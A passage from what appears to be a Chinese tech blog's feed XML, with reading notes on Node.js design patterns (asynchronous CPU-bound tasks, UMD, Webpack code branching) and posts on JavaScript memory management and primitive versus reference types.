把同步执行的代码变为异步执行即可。但是，这不是效率最好的模式；实际上，延迟执行一个任务会额外带来一个小的开销，在这样的算法中，积少成多，则会产生重大的影响。这通常是我们在运行 <code>CPU</code> 限制任务时所需要的最后一件事情，特别是如果我们必须将结果直接返回给用户，这应该在合理的时间内进行响应。缓解这个问题的一个可能的解决方案是只有在一定数量的步骤之后使用 <code>setImmediate()</code>，而不是在每一步中使用它。但是这仍然不能解决问题的根源。</p><p>记住，这并不是说一旦我们想要通过异步的模式来执行 <code>CPU-bound</code> 的任务，我们就应该不惜一切代价来避免这样的额外开销，事实上，从更广阔的角度来看，同步任务并不一定非常漫长和复杂，以至于造成麻烦。在繁忙的服务器中，即使是阻塞事件循环 200 毫秒的任务也会产生不希望的延迟。在那些并发量并不高的服务器来说，即使产生一定短时的阻塞，也不会影响性能，使用交错执行 <code>setImmediate()</code> 可能是避免阻塞事件循环的最简单也是最有效的方法。</p><blockquote><p><code>process.nextTick()</code> 不能用于交错长时间运行的任务。nextTick()会在任何未返回的 <code>I/O</code> 之前调度，并且在重复调用 <code>process.nextTick()</code> 最终会导致 <code>I/O</code> 饥饿。</p></blockquote><h3 id="使用多进程"><a href="#使用多进程" class="headerlink" title="使用多进程"></a>使用多进程</h3><p>防止事件循环阻塞的另一种模式是使用子进程。</p><p><code>Node.js</code> 有一个充足的 <code>API</code> 库带来与外部进程交互。我们可以在 <code>child_process</code> 模块中找到我们需要的所有东西。而且，当外部进程只是另一个 <code>Node.js</code> 程序时，将它连接到主应用程序是非常容易的，我们甚至不觉得我们在本地应用程序外部运行任何东西。这得益于 <code>child_process.fork()</code> 函数，该函数创建一个新的子 <code>Node.js</code> 进程，并自动创建一个通信管道，使我们能够使用与 <code>EventEmitter</code> 非常相似的接口交换信息。</p><p>关于多进程的使用及如何通信和查看 <a href="https://nodejs.org/dist/latest-v10.x/docs/api/child_process.html" target="_blank" rel="noopener">Child Processes</a>。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Advanced-Asynchronous-Recipes-高级异步方法&quot;&gt;&lt;a href=&quot;#Advanced-Asynchronous-Recipes-高级异步方法&quot; class=&quot;headerlink&quot; title=&quot;Advanced Asynchronous Recipes(高级异步方法)&quot;&gt;&lt;/a&gt;Advanced Asynchronous Recipes(高级异步方法)&lt;/h1&gt;&lt;h2 id=&quot;Requiring-aysnchronously-initialized-modules-引入异步初始化的模块&quot;&gt;&lt;a href=&quot;#Requiring-aysnchronously-initialized-modules-引入异步初始化的模块&quot; class=&quot;headerlink&quot; title=&quot;Requiring aysnchronously initialized modules(引入异步初始化的模块)&quot;&gt;&lt;/a&gt;Requiring aysnchronously initialized modules(引入异步初始化的模块)&lt;/h2&gt;&lt;p&gt;第二章中我们了解到，&lt;code&gt;require&lt;/code&gt; 是同步的，是不能异步更改 &lt;code&gt;module.exports&lt;/code&gt; 的，所以很多核心模块都包含了同步的 &lt;code&gt;API&lt;/code&gt;。但是有时候同步不一定有条件，例如在初始化的过程中需要请求网络获取某些参数，很多数据库、中间件(例如消息队列)等就是这种。&lt;/p&gt;
    
    </summary>
    
    
      <category term="读书笔记" scheme="http://1016990109.github.io/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>《Node.js 设计模式》读书笔记 第八章</title>
    <link href="http://1016990109.github.io/2018/09/25/Node-js-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E7%AC%AC%E5%85%AB%E7%AB%A0/"/>
    <id>http://1016990109.github.io/2018/09/25/Node-js-设计模式读书笔记-第八章/</id>
    <published>2018-09-25T03:54:47.000Z</published>
    <updated>2018-10-03T07:54:28.969Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Universal-JavaScript-for-Web-Applications-Web-应用的通用-JavaScript"><a href="#Universal-JavaScript-for-Web-Applications-Web-应用的通用-JavaScript" class="headerlink" title="Universal JavaScript for Web Applications(Web 应用的通用 JavaScript)"></a>Universal JavaScript for Web Applications(Web 应用的通用 JavaScript)</h1><h2 id="Sharing-code-with-browser-和浏览器共享代码"><a href="#Sharing-code-with-browser-和浏览器共享代码" class="headerlink" title="Sharing code with browser(和浏览器共享代码)"></a>Sharing code with browser(和浏览器共享代码)</h2><h3 id="Universal-Module-Definition-UMD"><a href="#Universal-Module-Definition-UMD" class="headerlink" title="Universal Module Definition(UMD)"></a>Universal Module Definition(UMD)</h3><p>一般来说需要同时满足浏览器和服务端要求，最常用的就是使用 <code>UMD</code> 规范了，<code>umd</code> 是 <code>AMD</code> 和 <code>CommonJS</code> 的糅合。先判断是否支持 <code>AMD</code>（通过判断 <code>define</code> 是否存在），存在则使用 <code>AMD</code> 方式加载模块。再判断是否支持 <code>Node.js</code> 的模块（<code>exports</code>）是否存在，存在则使用 <code>Node.js</code> 模块模式。如果两个都不存在，那么可能就使用全局变量来定义了(一般根据传入的 <code>root</code>，可能是执行的 <code>this</code>)。</p><a id="more"></a><p>给个例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">;(<span class="function"><span class="keyword">function</span>(<span class="params">root, factory</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> define === <span class="string">'function'</span> &amp;&amp; define.amd) &#123;</span><br><span class="line">    define([<span class="string">'mustache'</span>], factory)</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">module</span> === <span class="string">'object'</span> &amp;&amp; <span class="keyword">typeof</span> <span class="built_in">module</span>.exports === <span class="string">'object'</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> mustache = <span class="built_in">require</span>(<span class="string">'mustache'</span>)</span><br><span class="line">    <span class="built_in">module</span>.exports = factory(mustache)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    root.UmdModule = factory(root.Mustache)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)(<span class="keyword">this</span>, <span class="function"><span class="keyword">function</span>(<span class="params">mustache</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> template = <span class="string">'&lt;h1&gt;Hello &lt;i&gt;&#123;&#123;name&#125;&#125;&lt;/i&gt;&lt;/h1&gt;'</span></span><br><span class="line">  mustache.parse(template)</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    sayHello: <span class="function"><span class="keyword">function</span>(<span class="params">toWhom</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> mustache.render(template, &#123; <span class="attr">name</span>: toWhom &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="ES2015-Modules"><a href="#ES2015-Modules" class="headerlink" title="ES2015 Modules"></a>ES2015 Modules</h3><p><code>ES2015</code> 模块充分利用了 <code>AMD</code> 和 <code>CommonJS</code> 的优点：</p><ul><li>像 <code>CommonJS</code> 一样，<code>ES2015</code> 模块提供了简洁的语法，单独使用 <code>export</code> 导出模块而不用 <code>module.export = ...</code>，并且支持循环依赖。</li><li>像 <code>AMD</code> 一样，<code>ES2015</code> 模块直接就支持异步模块加载和可配置模块加载。</li></ul><h2 id="Introducing-Webpack-Webpack-介绍"><a href="#Introducing-Webpack-Webpack-介绍" class="headerlink" title="Introducing Webpack(Webpack 介绍)"></a>Introducing Webpack(Webpack 介绍)</h2><p><code>Webpack</code> 帮助我们将用 <code>Node.js</code> 模块规范些的代码编译成能在浏览器上运行的代码，解决了 <code>require</code> 在浏览器中的问题(浏览器是没有 <code>require</code> 函数的)。</p><p>上面的 <code>UMD</code> 代码变得更简洁：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mustache = <span class="built_in">require</span>(<span class="string">'mustache'</span>)</span><br><span class="line"><span class="keyword">var</span> template = <span class="string">'&lt;h1&gt;Hello &lt;i&gt;&#123;&#123;name&#125;&#125;&lt;/i&gt;&lt;/h1&gt;'</span></span><br><span class="line">mustache.parse(template)</span><br><span class="line"><span class="built_in">module</span>.exports.sayHello = <span class="function"><span class="keyword">function</span>(<span class="params">toWhom</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> mustache.render(template, &#123; <span class="attr">name</span>: toWhom &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ol><li>自动提供 <code>Node.js</code> 核心模块的浏览器兼容，如 <code>http</code>、<code>assert</code>、<code>events</code> 等等。<code>fs</code> 模块是不支持的。</li><li>如果不自动支持，可以手动引入兼容包，也就是 <code>polyfill</code> 这类的。</li><li>能从不同模块生成 <code>bundles</code>。</li><li>对源文件可做额外的操作，利用 <code>loaders</code> 和 <code>plugins</code> 来完成。</li><li>可以非常容易地通过任务执行管理器(例如 <code>Gulp</code> 或 <code>Grunt</code>)来执行 <code>Webpack</code>。</li><li>可以管理除 <code>JS</code> 文件外的文件预处理，如样式表文件、图片、字体、模板等等。</li><li>配置 <code>Webpack</code> 来分离依赖，组织代码为多个 <code>chunk</code>，做到动态加载，等需要的时候再加载。</li></ol><h3 id="Using-ES2015-with-Webpack-在-Webpack-中使用-ES2015"><a href="#Using-ES2015-with-Webpack-在-Webpack-中使用-ES2015" class="headerlink" title="Using ES2015 with Webpack(在 Webpack 中使用 ES2015)"></a>Using ES2015 with Webpack(在 Webpack 中使用 ES2015)</h3><p>前面有说到利用 <code>loaders</code> 和 <code>plugins</code> 来做额外的做操作，这里就利用 <code>babel-loader</code> 来将 <code>ES6</code> 的语法转为 <code>ES5</code>，只需要在 <code>webpack.config.js</code> 中配置：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  entry: path.join(__dirname, <span class="string">'src'</span>, <span class="string">'main.js'</span>),</span><br><span class="line">  output: &#123;</span><br><span class="line">    path: path.join(__dirname, <span class="string">'dist'</span>),</span><br><span class="line">    filename: <span class="string">'bundle.js'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    loaders: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: path.join(__dirname, <span class="string">'src'</span>),</span><br><span class="line">        loader: <span class="string">'babel-loader'</span>,</span><br><span class="line">        query: &#123;</span><br><span class="line">          presets: [<span class="string">'es2015'</span>]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Fundamentals-of-cross-platform-development-跨平台开发基础"><a href="#Fundamentals-of-cross-platform-development-跨平台开发基础" class="headerlink" title="Fundamentals of cross-platform development(跨平台开发基础)"></a>Fundamentals of cross-platform development(跨平台开发基础)</h2><p>为不同平台开发最主要的一个问题就是如何共享一个组件的公共部分(除去平台特定的部分)。</p><h3 id="Runtime-code-branching-运行时代码分支"><a href="#Runtime-code-branching-运行时代码分支" class="headerlink" title="Runtime code branching(运行时代码分支)"></a>Runtime code branching(运行时代码分支)</h3><p>当需要对平台定制化代码时，很容易就想到要根据当前的环境来加载不同的模块：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span> !== <span class="string">'undefined'</span> &amp;&amp; <span class="built_in">window</span>.document) &#123;</span><br><span class="line">  <span class="built_in">require</span>(<span class="string">'clientModule'</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">require</span>(<span class="string">'serverModule'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这有个问题就是，所有的模块都会被打包进去，会导致最终代码的大小太大。</p><h3 id="Build-time-code-branching-编译时代码分支"><a href="#Build-time-code-branching-编译时代码分支" class="headerlink" title="Build-time code branching(编译时代码分支)"></a>Build-time code branching(编译时代码分支)</h3><p>使用 <code>Webpack</code> 可以在编译时就将代码进行分割，只讲需要用的代码打包进最终包。</p><p>为了完成编译时代码分支，我们使用了两个内置的插件 <code>DefinePlugin</code> 和 <code>UglifyJsPlugin</code> 连接的管道。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.js</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> __BROWSER__ !== <span class="string">'undefined'</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Hey browser!'</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Hey Node.js!'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//webpack.config.js</span></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> definePlugin = <span class="keyword">new</span> webpack.DefinePlugin(&#123;</span><br><span class="line">  <span class="string">"__BROWSER__"</span>: <span class="literal">true</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> uglifyJsPlugin = <span class="keyword">new</span> webpack.UglifyJsPlugin(&#123;</span><br><span class="line">  beautify: <span class="literal">true</span>,</span><br><span class="line">  dead_code: <span class="literal">true</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  entry: path.join(__dirname, <span class="string">'src'</span>, <span class="string">'main.js'</span>),</span><br><span class="line">  output: &#123;</span><br><span class="line">    path: path.join(__dirname, <span class="string">'dist'</span>),</span><br><span class="line">    filename: <span class="string">'bundle.js'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [definePlugin, uglifyJsPlugin]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>DefinePlugin</code> 用来定义一个在源代码中能访问的一个全局变量，<code>UglifyJsPlugin</code> 用来减少最终生成的代码体积(因为去除了<strong>无用代码</strong>，这是在运行时代码分支里存在的问题，当然同时会去除掉一些空格之类的空白字符以及替换变量名等等)。</p><blockquote><p>需要注意的是，<code>DefinePlugin</code> 其实是在编译的时候找到源码中所有的 <code>__BROWSER__</code> 变量，然后将其替换为 <code>true</code>，和普通地声明一个全局变量不同。</p></blockquote><h3 id="Module-swapping-模块交换"><a href="#Module-swapping-模块交换" class="headerlink" title="Module swapping(模块交换)"></a>Module swapping(模块交换)</h3><p>有点时候我们会已知某些模块是不需要的，需要用其他模块来代替，这个时候再构建过程中去替换。</p><p><code>Webpack</code> 使用 <code>NormalModuleReplacementPlugin</code> 来完成这件事，匹配对应的正则表达式，然后用定义的模块替换掉匹配的模块。</p><p>这样有时候就很容易地将 <code>Node.js</code> 环境下运行的代码转换成浏览器运行的代码。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Universal-JavaScript-for-Web-Applications-Web-应用的通用-JavaScript&quot;&gt;&lt;a href=&quot;#Universal-JavaScript-for-Web-Applications-Web-应用的通用-JavaScript&quot; class=&quot;headerlink&quot; title=&quot;Universal JavaScript for Web Applications(Web 应用的通用 JavaScript)&quot;&gt;&lt;/a&gt;Universal JavaScript for Web Applications(Web 应用的通用 JavaScript)&lt;/h1&gt;&lt;h2 id=&quot;Sharing-code-with-browser-和浏览器共享代码&quot;&gt;&lt;a href=&quot;#Sharing-code-with-browser-和浏览器共享代码&quot; class=&quot;headerlink&quot; title=&quot;Sharing code with browser(和浏览器共享代码)&quot;&gt;&lt;/a&gt;Sharing code with browser(和浏览器共享代码)&lt;/h2&gt;&lt;h3 id=&quot;Universal-Module-Definition-UMD&quot;&gt;&lt;a href=&quot;#Universal-Module-Definition-UMD&quot; class=&quot;headerlink&quot; title=&quot;Universal Module Definition(UMD)&quot;&gt;&lt;/a&gt;Universal Module Definition(UMD)&lt;/h3&gt;&lt;p&gt;一般来说需要同时满足浏览器和服务端要求，最常用的就是使用 &lt;code&gt;UMD&lt;/code&gt; 规范了，&lt;code&gt;umd&lt;/code&gt; 是 &lt;code&gt;AMD&lt;/code&gt; 和 &lt;code&gt;CommonJS&lt;/code&gt; 的糅合。先判断是否支持 &lt;code&gt;AMD&lt;/code&gt;（通过判断 &lt;code&gt;define&lt;/code&gt; 是否存在），存在则使用 &lt;code&gt;AMD&lt;/code&gt; 方式加载模块。再判断是否支持 &lt;code&gt;Node.js&lt;/code&gt; 的模块（&lt;code&gt;exports&lt;/code&gt;）是否存在，存在则使用 &lt;code&gt;Node.js&lt;/code&gt; 模块模式。如果两个都不存在，那么可能就使用全局变量来定义了(一般根据传入的 &lt;code&gt;root&lt;/code&gt;，可能是执行的 &lt;code&gt;this&lt;/code&gt;)。&lt;/p&gt;
    
    </summary>
    
    
      <category term="读书笔记" scheme="http://1016990109.github.io/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>前端基础之JS内存管理</title>
    <link href="http://1016990109.github.io/2018/09/13/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%E4%B9%8BJS%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <id>http://1016990109.github.io/2018/09/13/前端基础之JS内存管理/</id>
    <published>2018-09-13T09:31:54.000Z</published>
    <updated>2018-09-13T09:43:18.103Z</updated>
    
    <content type="html"><![CDATA[<h2 id="内存生命周期"><a href="#内存生命周期" class="headerlink" title="内存生命周期"></a>内存生命周期</h2><ol><li>分配你所需要的内存</li><li>使用分配到的内存（读、写）</li><li>不需要时将其释放\归还</li></ol><a id="more"></a><h3 id="JavaScript-的内存分配"><a href="#JavaScript-的内存分配" class="headerlink" title="JavaScript 的内存分配"></a>JavaScript 的内存分配</h3><ul><li>值的初始化</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> n = <span class="number">123</span> <span class="comment">// 给数值变量分配内存</span></span><br><span class="line"><span class="keyword">var</span> s = <span class="string">'azerty'</span> <span class="comment">// 给字符串分配内存</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">  a: <span class="number">1</span>,</span><br><span class="line">  b: <span class="literal">null</span></span><br><span class="line">&#125; <span class="comment">// 给对象及其包含的值分配内存</span></span><br></pre></td></tr></table></figure><ul><li>函数调用分配内存</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>() <span class="comment">// 分配一个 Date 对象</span></span><br></pre></td></tr></table></figure><h3 id="当内存不再需要使用时释放"><a href="#当内存不再需要使用时释放" class="headerlink" title="当内存不再需要使用时释放"></a>当内存不再需要使用时释放</h3><p>高级语言解释器嵌入了“垃圾回收器”，它的主要工作是跟踪内存的分配和使用，以便当分配的内存不再使用时，自动释放它。这只能是一个近似的过程，因为要知道是否仍然需要某块内存是无法判定的（无法通过某种算法解决）。</p><h2 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h2><h3 id="引用计数垃圾收集"><a href="#引用计数垃圾收集" class="headerlink" title="引用计数垃圾收集"></a>引用计数垃圾收集</h3><p>老的浏览器使用这种方式，比如 <code>IE 6</code>，<code>IE 7</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">  a: &#123;</span><br><span class="line">    b: <span class="number">2</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 两个对象被创建，一个作为另一个的属性被引用，另一个被分配给变量o</span></span><br><span class="line"><span class="comment">// 很显然，没有一个可以被垃圾收集</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o2 = o <span class="comment">// o2变量是第二个对“这个对象”的引用</span></span><br><span class="line"></span><br><span class="line">o = <span class="number">1</span> <span class="comment">// 现在，“这个对象”的原始引用o被o2替换了</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> oa = o2.a</span><br><span class="line"><span class="comment">// 引用“这个对象”的a属性</span></span><br><span class="line"><span class="comment">// 现在，“这个对象”有两个引用了，一个是o2，一个是oa</span></span><br><span class="line"></span><br><span class="line">o2 = <span class="string">'yo'</span></span><br><span class="line"><span class="comment">// 最初的对象现在已经是零引用了</span></span><br><span class="line"><span class="comment">// 他可以被垃圾回收了</span></span><br><span class="line"><span class="comment">// 然而它的属性a的对象还在被oa引用，所以还不能回收</span></span><br><span class="line"></span><br><span class="line">oa = <span class="literal">null</span></span><br><span class="line"><span class="comment">// a属性的那个对象现在也是零引用了</span></span><br><span class="line"><span class="comment">// 它可以被垃圾回收了</span></span><br></pre></td></tr></table></figure><blockquote><p>限制，当有<strong>循环引用</strong>时，则无法进行垃圾回收。<br>    <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> o = &#123;&#125;</span><br><span class="line">  <span class="keyword">var</span> o2 = &#123;&#125;</span><br><span class="line">  o.a = o2 <span class="comment">// o 引用 o2</span></span><br><span class="line">  o2.a = o <span class="comment">// o2 引用 o</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="string">'azerty'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f()</span><br></pre></td></tr></table></figure></p></blockquote><h3 id="标记-清除算法"><a href="#标记-清除算法" class="headerlink" title="标记-清除算法"></a>标记-清除算法</h3><p>这个算法假定设置一个叫做根（<code>root</code>）的对象（在 <code>Javascript</code> 里，根是全局对象）。垃圾回收器将定期从根开始，找所有从根开始引用的对象，然后找这些对象引用的对象……从根开始，垃圾回收器将找到所有可以获得的对象和收集所有不能获得的对象。</p><p>这个算法比前一个要好，因为“有零引用的对象”总是不可获得的，但是相反却不一定，参考“循环引用”。</p><p>从 2012 年起，所有现代浏览器都使用了标记-清除垃圾回收算法。所有对 <code>JavaScript</code> 垃圾回收算法的改进都是基于标记-清除算法的改进，并没有改进标记-清除算法本身和它对“对象是否不再需要”的简化定义。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;内存生命周期&quot;&gt;&lt;a href=&quot;#内存生命周期&quot; class=&quot;headerlink&quot; title=&quot;内存生命周期&quot;&gt;&lt;/a&gt;内存生命周期&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;分配你所需要的内存&lt;/li&gt;
&lt;li&gt;使用分配到的内存（读、写）&lt;/li&gt;
&lt;li&gt;不需要时将其释放\归还&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="前端" scheme="http://1016990109.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="JS" scheme="http://1016990109.github.io/tags/JS/"/>
    
      <category term="内存管理" scheme="http://1016990109.github.io/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>前端基础之JS基本类型和引用类型</title>
    <link href="http://1016990109.github.io/2018/09/12/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%E4%B9%8BJS%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B%E5%92%8C%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B/"/>
    <id>http://1016990109.github.io/2018/09/12/前端基础之JS基本类型和引用类型/</id>
    <published>2018-09-12T01:24:47.000Z</published>
    <updated>2018-09-12T06:48:33.640Z</updated>
    
    <content type="html"><![CDATA[<p><code>JS</code> 中一个变量可以存放两种类型的值：基本类型和引用类型。</p><a id="more"></a><p><code>JS</code> 数据类型有 7 种(<code>ES6</code> 新增一种 <code>Symbol</code>):</p><p>基本类型(原始类型)：</p><ul><li><code>Boolean</code></li><li><code>Null</code></li><li><code>Undefined</code></li><li><code>Number</code></li><li><code>String</code></li><li><code>Symbol</code> (<code>ECMAScript</code> 6 新定义)，符号类型是唯一的并且是不可修改的</li></ul><p>引用类型(复杂类型)：</p><ul><li><code>Object</code></li></ul><h2 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h2><p>基本类型的值是按值访问</p><h3 id="基本类型的值是不可变的"><a href="#基本类型的值是不可变的" class="headerlink" title="基本类型的值是不可变的"></a>基本类型的值是不可变的</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">'123hello321'</span></span><br><span class="line">str.toUpperCase() <span class="comment">// 123HELLO321</span></span><br><span class="line"><span class="built_in">console</span>.log(str) <span class="comment">// 123hello321</span></span><br></pre></td></tr></table></figure><h3 id="基本类型的比较是它们的值的比较"><a href="#基本类型的比较是它们的值的比较" class="headerlink" title="基本类型的比较是它们的值的比较"></a>基本类型的比较是它们的值的比较</h3><p>不同类型之间也可以比较，因为做了隐式转换。涉及隐式转换最多的两个运算符 <code>+</code> 和 <code>==</code>。</p><p>隐式转换中主要涉及到三种转换：</p><ol><li>将值转为原始值，<code>ToPrimitive()</code>。</li><li>将值转为数字，<code>ToNumber()</code>。</li><li>将值转为字符串，<code>ToString()</code>。</li></ol><p><strong>通过 ToPrimitive 将值转换为原始值</strong></p><p><code>ToPrimitive(input, PreferredType?)</code></p><p><code>input</code> 是要转换的值，<code>PreferredType</code> 是可选参数，可以是 <code>Number</code> 或 <code>String</code> 类型。他只是一个转换标志，转化后的结果并不一定是这个参数所值的类型，但是转换结果一定是一个原始值（或者报错）。</p><p>如果 <code>PreferredType</code> 被标记为 <code>Number</code>，那么先是调用 <code>valueOf</code> 方法，如果返回值是原始值则结束；否则重新调用 <code>toString</code> 方法，如果是原始值则结束，不然就会抛出 <code>TypeError</code> 异常。<br>如果 <code>PreferredType</code> 被标记为 <code>String</code>，那么先是调用 <code>toString</code> 方法，如果返回值是原始值则结束；否则重新调用 <code>valueOf</code> 方法，如果是原始值则结束，不然就会抛出 <code>TypeError</code> 异常。(两者相反)</p><blockquote><p><code>valueOf()</code>：返回最适合该对象类型的原始值；<br><code>toString()</code>: 将该对象的原始值以字符串形式返回。</p></blockquote><blockquote><p>没有 <code>PrefferedType</code> 时，按照下面规则：如果该对象为 <code>Date</code> 类型，则 <code>PreferredType</code> 被设置为 <code>String</code>；否则，<code>PreferredType</code> 被设置为 <code>Number</code>。</p></blockquote><p><strong>通过 ToNumber 